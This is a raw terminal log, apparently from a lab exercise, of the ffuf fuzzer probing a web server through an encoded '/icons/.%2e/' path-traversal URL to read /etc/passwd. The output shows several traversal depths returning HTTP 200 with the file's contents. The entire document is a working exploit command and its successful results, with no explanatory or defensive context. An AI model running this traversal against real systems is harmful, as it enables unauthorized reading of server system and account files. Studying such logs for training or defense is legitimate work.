root@gw:/home/adrian# ffuf -u "http://[server_ip:server_port]/icons/.%2e/FUZZdepth/etc/passwd" -w depths.txt:FUZZdepth -mc 200 -fs 0

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://[server_ip:server_port]/icons/.%2e/FUZZdepth/etc/passwd
 :: Wordlist         : FUZZdepth: /home/adrian/depths.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200
 :: Filter           : Response size: 0
________________________________________________

:: Progress: [10/10] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors:%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/ [Status: 200, Size: 926, Words: 6, Lines: 20, Duration: 5ms]
:: Progress: [10/10] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors:%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/ [Status: 200, Size: 926, Words: 6, Lines: 20, Duration: 5ms]
:: Progress: [10/10] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors:%2e%2e/%2e%2e/%2e%2e/%2e%2e/ [Status: 200, Size: 926, Words: 6, Lines: 20, Duration: 5ms]
:: Progress: [10/10] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors:%2e%2e/%2e%2e/%2e%2e/   [Status: 200, Size: 926, Words: 6, Lines: 20, Duration: 6ms]
:: Progress: [10/10] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors:%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/ [Status: 200, Size: 926, Words: 6, Lines: 20, Duration: 6ms]
:: Progress: [10/10] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors:%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/ [Status: 200, Size: 926, Words: 6, Lines: 20, Duration: 9ms]
:: Progress: [10/10] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors:%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/ [Status: 200, Size: 926, Words: 6, Lines: 20, Duration: 12ms]
:: Progress: [10/10] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors:%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/ [Status: 200, Size: 926, Words: 6, Lines: 20, Duration: 7ms]
:: Progress: [10/10] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors::: Progress: [10/10] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::
